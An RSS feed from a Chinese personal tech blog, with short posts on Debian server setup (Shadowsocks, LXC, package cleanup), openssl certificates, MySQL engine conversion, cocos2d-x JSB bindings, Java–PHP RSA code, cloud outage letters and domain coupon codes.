<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>白天’s Blog</title>
    <link>http://example.org/</link>
    <description>Recent content on 白天’s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Fri, 16 Jun 2017 02:17:34 +0000</lastBuildDate><atom:link href="http://example.org/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Debian下安装Shadowsocks, supervisor守候进程</title>
      <link>http://example.org/2017/06/16/debian-install-shadowsocks-ss-supervisor/</link>
      <pubDate>Fri, 16 Jun 2017 02:17:34 +0000</pubDate>
      
      <guid>http://example.org/2017/06/16/debian-install-shadowsocks-ss-supervisor/</guid>
      <description>Debian下安装配置ShadowSocks的方法
1.系统更新并安装pip Shadowsocks
aptitude update aptitude install python-pip pip install shadowsocks 2.创建配置文件 /etc/shadowsocks.json
{ &amp;quot;server&amp;quot;:&amp;quot;0.0.0.0&amp;quot;, &amp;quot;server_port&amp;quot;:1080, &amp;quot;password&amp;quot;:&amp;quot;password&amp;quot;, &amp;quot;timeout&amp;quot;:600, &amp;quot;method&amp;quot;:&amp;quot;aes-256-cfb&amp;quot; } 配置的说明： Name Explanation server the address your server listens（服务器IP） local_address the address your local listens（本地代理地址） local_port local port（本地代理端口） port_password password used for encryption(自己设定的服务器端口和密码) timeout in seconds（超时断开，以秒为单位） method default: &amp;ldquo;aes-256-cfb&amp;rdquo;, see Encryption（加密方式） fast_open use TCP_FASTOPEN, true / false（是否使用TCP） workers number of workers, available on Unix/Linux（这个只在Unix和Linux下有用，可不设置）
3.启动 ssserver
ssserver -c /etc/shadowsocks.json start 4.</description>
    </item>
    
    <item>
      <title>使用openssl申请apple 开发证书</title>
      <link>http://example.org/2016/07/08/opnessl-apple-cer-to-p12/</link>
      <pubDate>Fri, 08 Jul 2016 09:20:35 +0000</pubDate>
      
      <guid>http://example.org/2016/07/08/opnessl-apple-cer-to-p12/</guid>
      <description>首选需要生成privkey在生成csr文件用于上传到apple
openssl genrsa -out privkey.key 2048 生成 csr
openssl req -new -key privkey.key -out privkey.csr 将apple开发者中心得到的cer文件转换为p12
首先需要装cer转换为pem
openssl x509 -in ios_distribution.cer -inform DER -out ios_distribution.cer.pem -outform PEM 然后在转换为p12，过程需要一个密码，在导入的时候使用
openssl pkcs12 -export -inkey privkey.key -in ios_distribution.cer.pem -out ios_distribution.p12 </description>
    </item>
    
    <item>
      <title>mysql innodb myisam 表格式互转</title>
      <link>http://example.org/2014/11/19/mysql-innodb-myisam-exchange/</link>
      <pubDate>Wed, 19 Nov 2014 08:30:44 +0000</pubDate>
      
      <guid>http://example.org/2014/11/19/mysql-innodb-myisam-exchange/</guid>
      <description>innodb 转换为 myisam
SELECT CONCAT(&#39;ALTER TABLE &#39;, table_name, &#39; ENGINE=MyISAM;&#39;) AS sql_statements INTO OUTFILE &#39;/tmp/result.txt&#39; FROM information_schema.tables AS tb WHERE table_schema = &#39;TableName&#39; AND `ENGINE` = &#39;InnoDB&#39; AND `TABLE_TYPE` = &#39;BASE TABLE&#39; ORDER BY table_name DESC; source /tmp/result.txt; myisam 转换为 innodb
SELECT CONCAT(&#39;ALTER TABLE &#39;, table_name, &#39; ENGINE=InnoDB;&#39;) AS sql_statements INTO OUTFILE &#39;/tmp/result.txt&#39; FROM information_schema.tables AS tb WHERE table_schema = &#39;TableName&#39; AND `ENGINE` = &#39;MyISAM&#39; AND `TABLE_TYPE` = &#39;BASE TABLE&#39; ORDER BY table_name DESC; source /tmp/result.</description>
    </item>
    
    <item>
      <title>升级到4.0并转移到腾讯运，速度真是爽爽的</title>
      <link>http://example.org/2014/10/15/upgrade-40-move-qcloud/</link>
      <pubDate>Wed, 15 Oct 2014 06:22:47 +0000</pubDate>
      
      <guid>http://example.org/2014/10/15/upgrade-40-move-qcloud/</guid>
      <description>真心便宜</description>
    </item>
    
    <item>
      <title>namecheap 大象节活动 ,转移7.88优惠</title>
      <link>http://example.org/2014/08/15/namecheap-world-elephant-day-transfer-788/</link>
      <pubDate>Fri, 15 Aug 2014 03:25:24 +0000</pubDate>
      
      <guid>http://example.org/2014/08/15/namecheap-world-elephant-day-transfer-788/</guid>
      <description>15 号结束，优惠码 SAVEDUMBO ，有需要的同学上吧。</description>
    </item>
    
    <item>
      <title>基于 Quercus 的手游项目终于上线了</title>
      <link>http://example.org/2014/01/27/quercus-php-ngame/</link>
      <pubDate>Mon, 27 Jan 2014 06:41:53 +0000</pubDate>
      
      <guid>http://example.org/2014/01/27/quercus-php-ngame/</guid>
      <description>经过半年的开发，我们第一款手游戏终于开发完毕，架构使用了 netty + Quercus 实现用 php 通过 websocket 与客户端通信。
项目上线近一个月，基本稳定。而且不存在性能方面问题，之前在内网测试，pc 机 4G 内存，在线 1000 人，没有卡动感觉。 这个数
字足以满足我们的需求， 想用 Quercus 大胆的用吧，到 4.0.39 应该会更完美，希望支持 Quercus 的多起来，与 hhvm 的火爆程度
真是是没法比。</description>
    </item>
    
    <item>
      <title>debian openvz vps 优化</title>
      <link>http://example.org/2014/01/08/debian-openvz-vps-optimize/</link>
      <pubDate>Wed, 08 Jan 2014 05:37:38 +0000</pubDate>
      
      <guid>http://example.org/2014/01/08/debian-openvz-vps-optimize/</guid>
      <description>比较喜欢 debian vps ，系统比较简洁，而且很省内存，但大部分的 vps 商都使用的标准模版，带了不少垃圾东西。
首先进行系统更新
apt-get update &amp;amp;&amp;amp; apt-get upgrade 安装sysv-rc-conf做为开机管理项
apt-get install sysv-rc-conf 先删除 apache 相关，使用 nginx 代替
apt-get remove --purge apache* 删除sendmail 相关
apt-get remove --purge sendmail* sasl2-bin 删除bind9相关
apt-get remove --purge bind9-* 删除xinetd 相关
apt-get remove --purge xinetd 删除samba相关
apt-get remove --purge samba-* 删除rpcbind相关
apt-get remove --purge rpcbind </description>
    </item>
    
    <item>
      <title>bae开如启用域名备案白名单了</title>
      <link>http://example.org/2014/01/07/bae-domain-beian-white-list/</link>
      <pubDate>Tue, 07 Jan 2014 05:57:10 +0000</pubDate>
      
      <guid>http://example.org/2014/01/07/bae-domain-beian-white-list/</guid>
      <description>前几天百度已经发过邮箱，昨天下午百度正式删除了没有备案的域名。
国内唯一没有强制要求备案的云计算就这样结束了，白天的博客也是没有备案的，开始计划寻找海外便宜的vps 做反向代理。</description>
    </item>
    
    <item>
      <title>debain OpenVZ 删除 apache</title>
      <link>http://example.org/2014/01/06/debain-openvz-vps-remove-apache/</link>
      <pubDate>Mon, 06 Jan 2014 13:39:35 +0000</pubDate>
      
      <guid>http://example.org/2014/01/06/debain-openvz-vps-remove-apache/</guid>
      <description>debain 系统的 vps ,如 directspace 一般初始都安装了 apache 而我要用 nginx ，但直接用 aptitude 删除，竟然删不掉
aptitude remove apache2 在次使用 aptitude
aptitude remove apache2-doc apache2-mpm-prefork apache2-utils apache2.2-bin apache2.2-common 还是没删掉，始用 dpkg
dpkg --purge apache2-doc apache2.2-common 终于清附掉了..</description>
    </item>
    
    <item>
      <title>2013年最后一个月 12月 全球Web服务器份额iis狂升</title>
      <link>http://example.org/2014/01/02/2013-12-web-server-survey/</link>
      <pubDate>Thu, 02 Jan 2014 07:08:43 +0000</pubDate>
      
      <guid>http://example.org/2014/01/02/2013-12-web-server-survey/</guid>
      <description>2013年12月，Netcraft从全球861,023,217家网站调查数据统计
Apache 相比 11月份 下滑 3 个点，占有率跌到 41.26% IIS 上升明显，比 11 月份上升 4 个点， 占有率升到 28.08% Nginx 稳步上升，占有率达到 14.69% Google 下跌至 4.44%</description>
    </item>
    
    <item>
      <title>百度两年没有更新blog首页了，今天终于更新了</title>
      <link>http://example.org/2013/12/28/two-year-not-update-now-update/</link>
      <pubDate>Sat, 28 Dec 2013 07:07:06 +0000</pubDate>
      
      <guid>http://example.org/2013/12/28/two-year-not-update-now-update/</guid>
      <description>blog 也是两年没更新了，百度收录量一直在减少。。基本收录为0了，最新更新了一些文章，blog 放到 bae3.0 上。快了不少，今天突然发现，首页更新了。</description>
    </item>
    
    <item>
      <title>bae关闭域名绑定功能</title>
      <link>http://example.org/2013/12/27/bae-close-bind-domain/</link>
      <pubDate>Fri, 27 Dec 2013 11:59:26 +0000</pubDate>
      
      <guid>http://example.org/2013/12/27/bae-close-bind-domain/</guid>
      <description>bae 最牛的地方莫过于可以绑定未备案的域名，现在突然关闭了绑定域名功能。
希望不要对以前未备案的域名下手。。</description>
    </item>
    
    <item>
      <title>blog 搬出 phpcloud</title>
      <link>http://example.org/2013/12/25/blog-move-phpcloud/</link>
      <pubDate>Wed, 25 Dec 2013 12:39:33 +0000</pubDate>
      
      <guid>http://example.org/2013/12/25/blog-move-phpcloud/</guid>
      <description>刚开始 phpcloud 推的时候，由于是zend推出的，想去试用一下，就把blog迁了过去，没想到麻从此开始了。
blog 访问并不大，但是 phpcloud 经常 把我的服务挂起，估计可能是用的人比较大，资源比较吃紧吧，稍占点资源就给挂起，
刚好 bae3.0 推出，比较中意，适用中。</description>
    </item>
    
    <item>
      <title>java(android) rsa 实现与 php 服务端通信</title>
      <link>http://example.org/2013/12/21/android-rsa-java-encryption-php-decrypt/</link>
      <pubDate>Sat, 21 Dec 2013 04:54:28 +0000</pubDate>
      
      <guid>http://example.org/2013/12/21/android-rsa-java-encryption-php-decrypt/</guid>
      <description>rsa 密钥生成 见 http://blog.andsky.com/js-rsa-use-openssl-make-public-pirvate-key/
android 客户端用rsa 公钥加密后经 base64 编码发到 服务端，服务端使用私钥解密
客户端代码
import java.math.BigInteger; import java.security.KeyFactory; import java.security.PublicKey; import java.security.spec.RSAPublicKeySpec; import javax.crypto.Cipher; import sun.misc.BASE64Encoder; public class rsa { public static void main(String[] args) throws Exception { String modulus = &amp;quot;C34FF1FF9771ED88814C26905297BAEDCEC03B847D8AB5620848FC100AC0564FAD5364E9834E29118E7B5F8B1B9EAB201730C4860E8AF2ED2E028704105A01044501A9EF6DA2968E76273AAE496A0963A2FEA9B6179A86F28ACC61C087FB1AEEA4E1CB0ADBB9B757C303741DE602FD790953C8E2C004A425C7CAF4813F403DCD&amp;quot;; String publicExponent = &amp;quot;010001&amp;quot;; rsa key = new rsa(); PublicKey publicKey = key.getPublicKey(modulus, publicExponent); Cipher cipher = Cipher.getInstance(&amp;quot;RSA/ECB/PKCS1Padding&amp;quot;); //明文 String tString = &amp;quot;aabbsdfsdf&amp;quot;; byte[] plainText = tString.getBytes(&amp;quot;UTF-8&amp;quot;); //加密 cipher.init(Cipher.ENCRYPT_MODE, publicKey); byte[] enBytes = cipher.</description>
    </item>
    
    <item>
      <title>quercus 4.0.38 发布</title>
      <link>http://example.org/2013/12/20/quercus-4-0-38-release/</link>
      <pubDate>Fri, 20 Dec 2013 04:33:23 +0000</pubDate>
      
      <guid>http://example.org/2013/12/20/quercus-4-0-38-release/</guid>
      <description>修正了不少bug 真是越来越完善了，赞一个
quercus: empty() needs to call ArrayAccess-&amp;gt;offsetExists() (#5612, rep by G. Krall) quercus: session_status() not implemented (#5609, rep by G. Krall) quercus: self doesn&amp;rsquo;t work inside a namespace (#5608, G. Krall) quercus: ReflectionParameter-&amp;gt;getClass() not implemented (#5607, rep by G. Krall) quercus: IllegalArgumentException vfs: not found on JBoss (#5606, rep by G. Krall) quercus: ReflectionFunction does not work for closures (#5605, rep by G. Krall) quercus: Xml reader is not working (#5603, rep by qumo) quercus: call_user_func() needs to call __invoke (#5601, rep by G.</description>
    </item>
    
    <item>
      <title>php实现websocket手游架构设想</title>
      <link>http://example.org/2013/12/20/php-websocket-game/</link>
      <pubDate>Fri, 20 Dec 2013 03:53:45 +0000</pubDate>
      
      <guid>http://example.org/2013/12/20/php-websocket-game/</guid>
      <description>众所周知 php 的开发效率确实块。但在 socket 这块一直没有什么大的发展，设想用 两种方案用 php 实现 websocket game 开发
方案1 netty+quercus+php
方案2 Swoole + php
两种方案感觉都可行，quercus 近期更新力度很大，已经解决 mysql 乱码问题。 php 转成 java 测试性能确实不错
Swoole 是近期关注比较多的了，php 原生实现，作者更新速度很快，但缺少实际项目案例。
两种方案选择了 quercus ，感觉应该更稳定一些，实践中，期待项目上线测试效果</description>
    </item>
    
    <item>
      <title>又拍云第二封故障信</title>
      <link>http://example.org/2013/12/16/upyun-two-fault/</link>
      <pubDate>Mon, 16 Dec 2013 04:10:59 +0000</pubDate>
      
      <guid>http://example.org/2013/12/16/upyun-two-fault/</guid>
      <description>关于又拍云12月5日故障的说明‏
用户发展太快？不里处理速度还是另人满意的。 补偿好像没收到哈。
尊敬的又拍云用户： 我们为12月5日一组作图服务器故障导致部分图片上传失败给您带来的困扰深表抱歉，为避免您对此的担忧，我们向您坦诚这次故障的具体问题，让您了解这次意外的原因。 因又拍云存储平台的数据量急速上涨，云处理集群的压力也快速放大。为提前缓解数据放大带来的压力，提升作图服务器集群性能，12月5日凌晨，又拍云存储更新部署了一批新的作图服务器，并开启了作图服务的CPU亲缘性绑定支持，将服务绑定到了相应的CPU核心上。这个模式在非超线程环境的服务器中运行良好。但在这批开启了超线程支持的服务器上，随着当天下午请求高峰期的到来，逐渐出现不稳定现象，导致上层proxy超时，在该集群造成雪崩效应；由于我们初期对故障的定位偏差，在进行了系统内核降级、作图服务版本回滚等几项措施之后，未能快速缓解处理该问题，直至最后关闭超线程支持。 在新集群出现不稳定时，我们已紧急切换到了备用集群。但由于作图请求的雪崩效应，导致后备集群一直高负载运行，期间调用图片服务集群的图片上传、缩略图处理的不稳定状况持续了一段时间。在新集群关闭超线程支持、并确认状态正常，重新接入系统后，服务逐步恢复。 您信任我们，将您的数据放在了又拍云存储，出现这样的问题，我们非常的不安，也非常的抱歉，一次故障意味着给您带去了巨大的损失，这个损失我们不知该如何弥补，所以我们决定向您补偿一周的流量并延长一个月的存储使用期限。同时我们将对后续服务持续优化以保证更高的稳定性，避免类似意外的再次发生。我们再次恳请您的谅解。感谢您一直以来对又拍云的支持！ 杭州纬聚网络有限公司 2013.12.6 </description>
    </item>
    
    <item>
      <title>js rsa 使用 openssl 生成公钥私钥</title>
      <link>http://example.org/2013/12/12/js-rsa-use-openssl-make-public-pirvate-key/</link>
      <pubDate>Thu, 12 Dec 2013 08:08:15 +0000</pubDate>
      
      <guid>http://example.org/2013/12/12/js-rsa-use-openssl-make-public-pirvate-key/</guid>
      <description>生成私钥
openssl genrsa -out key.pem 得到16进制公钥
openssl rsa -in key.pem -noout -modulus 直接放到js里就可以使用了</description>
    </item>
    
    <item>
      <title>给又拍云用户的一封致歉信‏</title>
      <link>http://example.org/2013/12/11/upyun-apologize/</link>
      <pubDate>Wed, 11 Dec 2013 16:42:26 +0000</pubDate>
      
      <guid>http://example.org/2013/12/11/upyun-apologize/</guid>
      <description>从去年开始用又拍云，收到的第一封故障信，总的来说，还是不错的，如果能像七牛一样，后付费就更好了
亲爱的又拍云存储用户：
2013年11月26日12时，又拍云监控系统报警，提示一部分新数据未能通过API接口上传。技术人员迅速排查，发现一台用于业务数据存储的MySQL服务器异常退出。技术人员当即启动应急预案，将这部分服务切换到灾备数据库，并进行了数据同步，至13时左右服务恢复正常。
服务恢复后，经过全面复检确认：该问题原因是又拍云的数据量级近期暴增，触发了MySQL Bug #63815 Reorganization May Make a Page Incompressible (http://bugs.mysql.com/bug.php?id=63815)，导致MySQL数据分块损坏，无法启动服务。现已对主库的数据进行了恢复和校验，并于27日凌晨已完成数据切换。
我们为未能及时做好此问题的防范，给一部分用户带来了影响，在此表示万分的抱歉。我们已于27日上午开始进行数据库的升级准备工作，并将尽快部署完成。在万分抱歉的同时，我们希望此问题不至于给您带来过多的困扰。云存储的发展始终伴随着承载更高数据的挑战，在这一挑战过程中必定伴随着一些没有经历大数据存储就很难知悉的问题。恳请大家相信，又拍云团队在8年的发展和磨练中，具备了对未知情况最大可能的预见能力和在最短时间内解决问题的能力。这次问题对于我们是一个深刻的教训，又拍云将着手进行持续的大数据的模拟，确保在更大数据量来临前，我们为大家做好了最安全的防范措施。
同时，也请这个故障时间段内未出现上传故障、未受到影响的各位用户放心，所有用户的数据外部访问和老数据的存储都未受影响，您的服务在此期间确保正常。如对上述情况有疑问，请您立即联系我们进行沟通，我们将竭尽全力协助您获得满意的结果。
最后，再一次向受此故障影响的各位支持又拍云的朋友们表示万分的歉意。</description>
    </item>
    
    <item>
      <title>cocos2d-x jsb 绑定 ClippingNode</title>
      <link>http://example.org/2013/12/10/cocos2d-x-jsb-binding-clippingnode/</link>
      <pubDate>Tue, 10 Dec 2013 13:29:54 +0000</pubDate>
      
      <guid>http://example.org/2013/12/10/cocos2d-x-jsb-binding-clippingnode/</guid>
      <description>JSClass *jsb_ClippingNode_class; JSObject *jsb_ClippingNode_prototype; JSBool js_cocos2dx_ClippingNode_isInverted(JSContext *cx, uint32_t argc, jsval *vp) { JSObject *obj = JS_THIS_OBJECT(cx, vp); js_proxy_t *proxy = jsb_get_js_proxy(obj); cocos2d::CCClippingNode* cobj = (cocos2d::CCClippingNode *)(proxy ? proxy-&amp;gt;ptr : NULL); JSB_PRECONDITION2( cobj, cx, JS_FALSE, &amp;quot;Invalid Native Object&amp;quot;); if (argc == 0) { bool ret = cobj-&amp;gt;isInverted(); jsval jsret; jsret = BOOLEAN_TO_JSVAL(ret); JS_SET_RVAL(cx, vp, jsret); return JS_TRUE; } JS_ReportError(cx, &amp;quot;wrong number of arguments: %d, was expecting %d&amp;quot;, argc, 0); return JS_FALSE; } JSBool js_cocos2dx_ClippingNode_visit(JSContext *cx, uint32_t argc, jsval *vp) { JSObject *obj = JS_THIS_OBJECT(cx, vp); js_proxy_t *proxy = jsb_get_js_proxy(obj); cocos2d::CCClippingNode* cobj = (cocos2d::CCClippingNode *)(proxy ?</description>
    </item>
    
    <item>
      <title>cocos2d-x jsb 绑定 removeAllDelegates</title>
      <link>http://example.org/2013/12/10/cocos2d-x-jsb-binding-removealldelegates/</link>
      <pubDate>Tue, 10 Dec 2013 13:20:52 +0000</pubDate>
      
      <guid>http://example.org/2013/12/10/cocos2d-x-jsb-binding-removealldelegates/</guid>
      <description>html5版为
cc.Director.getInstance().getTouchDispatcher().removeAllDelegates()； 但 jsb 下没有，绑定一下。
void JSTouchDelegate::removeAllDelegates() { CCDirector* pDirector = CCDirector::sharedDirector(); pDirector-&amp;gt;getTouchDispatcher()-&amp;gt;removeAllDelegates(); } JSBool js_cocos2dx_JSTouchDelegate_removeAllDelegates(JSContext *cx, uint32_t argc, jsval *vp) { if (argc == 0) { JSTouchDelegate *touch = new JSTouchDelegate(); touch-&amp;gt;autorelease(); touch-&amp;gt;removeAllDelegates(); return JS_TRUE; } JS_ReportError(cx, &amp;quot;wrong number of arguments&amp;quot;); return JS_FALSE; } JS_DefineFunction(cx, ns, &amp;quot;removeAllDelegates&amp;quot;, js_cocos2dx_JSTouchDelegate_removeAllDelegates, 1, JSPROP_READONLY | JSPROP_PERMANENT); </description>
    </item>
    
    <item>
      <title>阿里云(aliyun)青岛节点挂载硬盘io测试</title>
      <link>http://example.org/2013/12/06/aliyun-shandong-mount-disk-io-test/</link>
      <pubDate>Fri, 06 Dec 2013 12:24:36 +0000</pubDate>
      
      <guid>http://example.org/2013/12/06/aliyun-shandong-mount-disk-io-test/</guid>
      <description>杭州节点已经停售了，在青岛订购了一台，贴上测试结果。
fdisk -l Disk /dev/xvda: 21.5 GB, 21474754560 bytes 255 heads, 63 sectors/track, 2610 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk identifier: 0x00090497 Device Boot Start End Blocks Id System /dev/xvda1 * 1 2611 20969472 83 Linux Disk /dev/xvdb: 53.7 GB, 53687091200 bytes 255 heads, 63 sectors/track, 6527 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk identifier: 0x00000000 Disk /dev/xvdb doesn&#39;t contain a valid partition table 分区</description>
    </item>
    
    <item>
      <title>debian 下安装 lxc</title>
      <link>http://example.org/2013/11/23/lxc-on-debian-squeeze/</link>
      <pubDate>Sat, 23 Nov 2013 07:48:26 +0000</pubDate>
      
      <guid>http://example.org/2013/11/23/lxc-on-debian-squeeze/</guid>
      <description>本文安装环境 debian 6.0
安装 lxc debootstrap 工具
aptitude install lxc bridge-utils debootstrap 设置网络
auto eth1 iface eth1 inet manual auto br0 iface br0 inet static bridge_ports eth1 #根据自己实际网卡设置 bridge_fd 0 address 10.0.0.100 netmask 255.255.255.0 gateway 10.100.0.1 dns-nameservers 10.20.0.2 加载 cgroup 编辑 /etc/fstab
cgroup /sys/fs/cgroup cgroup defaults 0 0 立即加载
mount /sys/fs/cgroup 接下来创建一下虚拟机
#下载 squeeze 64位 debootstrap --verbose --variant=minbase --arch=amd64 --include ifupdown,locales,libui-dialog-perl,\ dialog,netbase,net-tools,iproute,openssh-server,vim,apt-utils,proxychains \ squeeze /var/cache/lxc/debian/rootfs-amd64 http://mirrors.163.com/debian/ mkdir -p /lxc/vm0 #存放目录 /usr/lib/lxc/templates/lxc-debian -p /lxc/vm0/ # 创建虚拟机 配置虚拟机网络,在 /lxc/vm0/config 文件填加些文本</description>
    </item>
    
    <item>
      <title>debian 下 lxc 限制内存出错</title>
      <link>http://example.org/2013/11/23/debian-lxc-memory-limit_in_bytes-no-such-file-or-directory/</link>
      <pubDate>Sat, 23 Nov 2013 06:53:40 +0000</pubDate>
      
      <guid>http://example.org/2013/11/23/debian-lxc-memory-limit_in_bytes-no-such-file-or-directory/</guid>
      <description>起动 vm 的时候出现
lxc-start: open /cgroup/vm0/memory.limit_in_bytes : No such file or directory lxc-start: failed to setup the cgroups for &amp;lsquo;vm0&amp;rsquo; lxc-start: failed to setup the container lxc-start: invalid sequence number 1. expected 2 lxc-start: failed to spawn &amp;lsquo;vm0&amp;rsquo;
在 /etc/default/grub 文件填加
GRUB_CMDLINE_LINUX=&amp;quot;cgroup_enable=memory&amp;quot; 0# lxc-checkconfig Kernel config /proc/config.gz not found, looking in other places... Found kernel config file /boot/config-2.6.32-5-amd64 --- Namespaces --- Namespaces: enabled Utsname namespace: enabled Ipc namespace: enabled Pid namespace: enabled User namespace: enabled Network namespace: enabled Multiple /dev/pts instances: enabled --- Control groups --- Cgroup: enabled Cgroup namespace: enabled Cgroup device: enabled Cgroup sched: enabled Cgroup cpu account: enabled Cgroup memory controller: missing Cgroup cpuset: enabled --- Misc --- Veth pair device: enabled Macvlan: enabled Vlan: enabled File capabilities: enabled </description>
    </item>
    
    <item>
      <title>debian  bridge 网卡参数说明</title>
      <link>http://example.org/2013/11/23/debian-bridge-opt/</link>
      <pubDate>Sat, 23 Nov 2013 05:43:29 +0000</pubDate>
      
      <guid>http://example.org/2013/11/23/debian-bridge-opt/</guid>
      <description>bridge_fd is the bridge forward delay time, in seconds, default 15.
bridge_hello is the bridge hello time, in seconds, default 2.
bridge_maxage is the bridge’s maximum message time, in seconds, default is 20.
bridge_stp controls the spanning tree protocol, on or off. Default is off, and is recommended to stay that way.</description>
    </item>
    
    <item>
      <title>lxc guest 报错 respawning too disabled minutes</title>
      <link>http://example.org/2013/11/23/lxc-guest-respawning-too-disabled-minutes/</link>
      <pubDate>Sat, 23 Nov 2013 05:24:29 +0000</pubDate>
      
      <guid>http://example.org/2013/11/23/lxc-guest-respawning-too-disabled-minutes/</guid>
      <description>INIT: Id &amp;quot;c1&amp;quot; respawning too fast: disabled for 5 minutes INIT: Id &amp;quot;c4&amp;quot; respawning too fast: disabled for 5 minutes INIT: Id &amp;quot;c1&amp;quot; respawning too fast: disabled for 5 minutes INIT: Id &amp;quot;c2&amp;quot; respawning too fast: disabled for 5 minutes INIT: Id &amp;quot;c3&amp;quot; respawning too fast: disabled for 5 minutes INIT: Id &amp;quot;c4&amp;quot; respawning too fast: disabled for 5 minutes INIT: Id &amp;quot;c1&amp;quot; respawning too fast: disabled for 5 minutes INIT: Id &amp;quot;c2&amp;quot; respawning too fast: disabled for 5 minutes INIT: Id &amp;quot;c3&amp;quot; respawning too fast: disabled for 5 minutes INIT: Id &amp;quot;c4&amp;quot; respawning too fast: disabled for 5 minutes 解决方法 编辑 /etc/inittab</description>
    </item>
    
    <item>
      <title>mysql 5.5 半同步停止工作</title>
      <link>http://example.org/2013/11/22/mysql-5-5-semi_sync-stop/</link>
      <pubDate>Fri, 22 Nov 2013 12:10:34 +0000</pubDate>
      
      <guid>http://example.org/2013/11/22/mysql-5-5-semi_sync-stop/</guid>
      <description>两台 mysql 5.5 服务器互为主从，使且半同步模式，网络终断后，但是 同步未能恢复
mysql&amp;gt; show status like &#39;Rpl_%&#39;; +--------------------------------------------+-------------+ | Variable_name | Value | +--------------------------------------------+-------------+ | Rpl_semi_sync_master_clients | 0 | | Rpl_semi_sync_master_net_avg_wait_time | 213 | | Rpl_semi_sync_master_net_wait_time | 51387187879 | | Rpl_semi_sync_master_net_waits | 240543674 | | Rpl_semi_sync_master_no_times | 2 | | Rpl_semi_sync_master_no_tx | 6402 | | Rpl_semi_sync_master_status | OFF | | Rpl_semi_sync_master_timefunc_failures | 0 | | Rpl_semi_sync_master_tx_avg_wait_time | 276 | | Rpl_semi_sync_master_tx_wait_time | 68522585281 | | Rpl_semi_sync_master_tx_waits | 248230976 | | Rpl_semi_sync_master_wait_pos_backtraverse | 1101735 | | Rpl_semi_sync_master_wait_sessions | 0 | | Rpl_semi_sync_master_yes_tx | 240799932 | | Rpl_semi_sync_slave_status | ON | | Rpl_status | AUTH_MASTER | +--------------------------------------------+-------------+ 恢复操作</description>
    </item>
    
    <item>
      <title>cocos2d-x 2.1.5 jsb 读取 plist</title>
      <link>http://example.org/2013/10/17/cocos2d-x-2-1-5-jsb-read-plist/</link>
      <pubDate>Thu, 17 Oct 2013 09:15:32 +0000</pubDate>
      
      <guid>http://example.org/2013/10/17/cocos2d-x-2-1-5-jsb-read-plist/</guid>
      <description>static JSBool js_cocos2dx_CCFileUtils_createDictionaryWithContentsOfFile(JSContext *cx, uint32_t argc, jsval *vp) { jsval *argv = JS_ARGV(cx, vp); JSBool ok = JS_TRUE; JSObject *obj = JS_THIS_OBJECT(cx, vp); js_proxy_t *proxy = jsb_get_js_proxy(obj); cocos2d::CCFileUtils* cobj = (cocos2d::CCFileUtils *)(proxy ? proxy-&amp;gt;ptr : NULL); JSB_PRECONDITION2( cobj, cx, JS_FALSE, &amp;quot;Invalid Native Object&amp;quot;); if (argc == 1) { std::string arg0; ok &amp;amp;= jsval_to_std_string(cx, argv[0], &amp;amp;arg0;); JSB_PRECONDITION2(ok, cx, JS_FALSE, &amp;quot;Error processing arguments&amp;quot;); cocos2d::CCDictionary* ret = CCDictionary::createWithContentsOfFile(arg0.c_str()); jsval jsret; jsret = ccdictionary_to_jsval(cx, ret); JS_SET_RVAL(cx, vp, jsret); return JS_TRUE; } JS_ReportError(cx, &amp;quot;wrong number of arguments: %d, was expecting %d&amp;quot;, argc, 1); return JS_FALSE; } </description>
    </item>
    
    <item>
      <title>cocos2d-x 2.1.5 clippingNode在 jsb 下无效的修改</title>
      <link>http://example.org/2013/09/23/cocos2d-x-clippingnode-jsb-fix/</link>
      <pubDate>Mon, 23 Sep 2013 13:25:54 +0000</pubDate>
      
      <guid>http://example.org/2013/09/23/cocos2d-x-clippingnode-jsb-fix/</guid>
      <description>**http://cocos2d-x.org/boards/6/topics/20141?r=20567#message-20567 **
for iOS: in AppController replace the gl-view creation with:
EAGLView *__glView = [EAGLView viewWithFrame: [window bounds] pixelFormat: kEAGLColorFormatRGBA8 depthFormat: GL_DEPTH24_STENCIL8_OES preserveBackbuffer: NO sharegroup: nil multiSampling: NO numberOfSamples: 0]; for Android: in game activity:
public Cocos2dxGLSurfaceView onCreateView() { Cocos2dxGLSurfaceView glSurfaceView = new Cocos2dxGLSurfaceView(this); glSurfaceView.setEGLConfigChooser(5, 6, 5, 0, 16, 8); return glSurfaceView; } </description>
    </item>
    
    <item>
      <title>bae联通节点更新ip,广州长宽终于正常了</title>
      <link>http://example.org/2013/09/16/bae-unicom-change-ip-gwbn/</link>
      <pubDate>Mon, 16 Sep 2013 15:54:37 +0000</pubDate>
      
      <guid>http://example.org/2013/09/16/bae-unicom-change-ip-gwbn/</guid>
      <description>bae 联通节点之前一直用的是 63开头的ip,长城宽带一直打不开。。有时 hao123 都打不开。。 ,今天打开 blog 一下就开了。。发现联通节点变成了 202.108.23.200 速度还真不错，不知道是不是前几天我在群里反应长城宽带打不开网站就调整了哈。</description>
    </item>
    
    <item>
      <title>jsonp 后 ie 下 cookie 还是不能跨域问题</title>
      <link>http://example.org/2013/04/16/jsonp-ie-dot-cookie-domain/</link>
      <pubDate>Tue, 16 Apr 2013 10:14:26 +0000</pubDate>
      
      <guid>http://example.org/2013/04/16/jsonp-ie-dot-cookie-domain/</guid>
      <description>在非 ie 都 直用 jsonp cookie 是没问题，但是在 ie 下不能生效，还是得靠 p3p 解决
header(&#39;P3P:CP=&amp;quot;IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT&amp;quot;&#39;); </description>
    </item>
    
    <item>
      <title>godaddy 2013年2月2.95美元域名优惠码可以国内信用卡付款！</title>
      <link>http://example.org/2013/02/28/2013-02-godaddy-domain-295-cost/</link>
      <pubDate>Thu, 28 Feb 2013 03:25:31 +0000</pubDate>
      
      <guid>http://example.org/2013/02/28/2013-02-godaddy-domain-295-cost/</guid>
      <description>godaddy的超级优惠码已经很久都不支持国内的信用卡付款了，今天终于有一枚支持国内信用卡的godaddy域名优惠码吧！
godaddy 2013年2月2.95美元域名优惠码
iap295f
